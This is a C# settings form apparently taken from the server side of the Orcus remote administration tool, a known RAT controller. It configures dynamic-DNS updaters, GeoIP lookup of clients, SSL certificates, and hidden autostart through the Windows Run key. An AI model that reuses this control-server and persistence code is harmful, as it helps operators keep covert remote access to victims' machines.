using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using nUpdate.Updating;
using Orcus.Server.Core;
using Orcus.Server.Core.Config;
using Orcus.Server.Core.Plugins;
using Orcus.Server.UpdaterView;
using Orcus.Server.Utilities;

namespace Orcus.Server.Forms
{
    public partial class SettingsWindow : Form
    {
        private readonly TcpServer _server;
        private readonly Settings _settings;

        private readonly Dictionary<string, IUpdaterView> _updateSettingsViews = new Dictionary<string, IUpdaterView>
        {
            {"No-IP Updater", new UpdaterView.NoIpUpdater()},
            {"Secure DNS Updater", new UpdaterView.SecureDnsUpdater()},
            {"Namecheap Updater", new UpdaterView.NamecheapUpdater()}
        };

        public SettingsWindow(Settings settings, TcpServer server)
        {
            _settings = settings;
            _server = server;
            InitializeComponent();

            try
            {
                using (
                    var registryKey =
                        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    AutostartCheckBox.Checked = string.Equals(registryKey.GetValue("Orcus Server")?.ToString(),
                        $"\"{Application.ExecutablePath}\" /hidden", StringComparison.OrdinalIgnoreCase);
                }
            }
            catch (Exception)
            {
                AutostartCheckBox.Checked = false;
                AutostartCheckBox.Enabled = false;
            }


            PluginsListBox.DataSource = Settings.GetUpdatePlugins();
            PluginsListBox.DisplayMember = "Name";
            PluginsListBox.SelectedIndex = Settings.GetUpdatePlugins().IndexOf(settings.UpdatePlugin);

            GeoIpCheckBox.Checked = _settings.IsGeoIpLocationEnabled;
            GeoIpCheckBox_CheckedChanged(null, null);
            Ip2LocationEmailTextBox.Text = _settings.Ip2LocationEmailAddress;
            Ip2LocationPasswordTextBox.Text = _settings.Ip2LocationPassword;
        }

        private void AutostartCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            var rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            var name = "Orcus Server";
            if (AutostartCheckBox.Checked)
                rk.SetValue(name, $"\"{Application.ExecutablePath}\" /hidden");
            else
                rk.DeleteValue(name, false);
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);

            _settings.IsDnsUpdaterEnabled = EnableUpdaterCheckBox.Checked;
            if (EnableUpdaterCheckBox.Checked)
            {
                var plugin = (IUpdatePlugin) PluginsListBox.SelectedItem;
                var view = _updateSettingsViews[plugin.Name];
                if (!view.ValidateInputs())
                {
                    e.Cancel = true;
                    return;
                }

                _settings.UpdatePlugin = plugin;
                if (_server.IsRunning)
                    _settings.UpdatePlugin.ServerStarted();

                _server.DnsHostName = _settings.UpdatePlugin.Host;
            }

            _settings.IsGeoIpLocationEnabled = GeoIpCheckBox.Checked;
            if (GeoIpCheckBox.Checked)
            {
                if (string.IsNullOrWhiteSpace(Ip2LocationEmailTextBox.Text))
                {
                    MessageBox.Show("Please input an email address or disable the geo location.", "Error",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    e.Cancel = true;
                    return;
                }

                if (string.IsNullOrWhiteSpace(Ip2LocationPasswordTextBox.Text))
                {
                    MessageBox.Show("Please input a password or disable the geo location.", "Error",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    e.Cancel = true;
                    return;
                }

                _server.Ip2LocationEmailAddress = Ip2LocationEmailTextBox.Text;
                _server.Ip2LocationPassword = Ip2LocationPasswordTextBox.Text;
                _settings.Ip2LocationEmailAddress = Ip2LocationEmailTextBox.Text;
                _settings.Ip2LocationPassword = Ip2LocationPasswordTextBox.Text;
               // _server.ReloadGeoIpLocationService();
            }
            else
            {
                _server.Ip2LocationEmailAddress = null;
                _server.Ip2LocationPassword = null;
                _settings.Ip2LocationEmailAddress = null;
                _settings.Ip2LocationPassword = null;
            }

            if (_settings.SslCertificatePath != SslPathTextBox.Text ||
                _settings.SslCertificatePassword != SslPasswordTextBox.Text)
                MessageBox.Show("Please restart this application for the applied changes to take effect",
                    "SSL Certificate", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            _settings.SslCertificatePath = SslPathTextBox.Text;
            _settings.SslCertificatePassword = SslPasswordTextBox.Text;

            _settings.Save();
        }

        private void EnableIpUpdater_CheckedChanged(object sender, EventArgs e)
        {
            PluginSettingsPanel.Enabled = EnableUpdaterCheckBox.Checked;
            PluginsListBox.Enabled = EnableUpdaterCheckBox.Checked;
        }

        private void SettingsWindow_Load(object sender, EventArgs e)
        {
            EnableUpdaterCheckBox.Checked = _settings.IsDnsUpdaterEnabled;
            EnableIpUpdater_CheckedChanged(null, null);
            SslPathTextBox.Text = _settings.SslCertificatePath;
            SslPasswordTextBox.Text = _settings.SslCertificatePassword;
        }

        private void OpenSslCertificateButton_Click(object sender, EventArgs e)
        {
            var ofd = new OpenFileDialog
            {
                Filter = "PFX file|*.pfx|All files|*.*",
                Title = "Please select a valid ssl certificate"
            };

            if (ofd.ShowDialog(this) == DialogResult.OK)
                SslPathTextBox.Text = ofd.FileName;
        }

        private void CreateSslCertificate_Click(object sender, EventArgs e)
        {
            var window = new CreateSslCertificateWindow();
            if (window.ShowDialog(this) == DialogResult.OK)
            {
                SslPathTextBox.Text = window.Path;
                SslPasswordTextBox.Text = window.Password;
            }
        }

        private void PluginsListBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            PluginSettingsPanel.Controls.Clear();
            var plugin = (IUpdatePlugin) PluginsListBox.SelectedItem;
            if (plugin == null)
                return;

            var view = _updateSettingsViews[plugin.Name];
            view.Initizalize(plugin);

            var control = (Control) view;
            control.Dock = DockStyle.Fill;
            PluginSettingsPanel.Controls.Add(control);
        }

        private void GeoIpCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            Ip2LocationEmailTextBox.Enabled = GeoIpCheckBox.Checked;
            Ip2LocationPasswordTextBox.Enabled = GeoIpCheckBox.Checked;
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://lite.ip2location.com/sign-up");
        }

        private void SearchForUpdatesButton_Click(object sender, EventArgs e)
        {
            var manager = Updater.GetUpdateManager();
            var updaterUi = new UpdaterUI(manager, SynchronizationContext.Current);
            updaterUi.ShowUserInterface();
        }
    }
}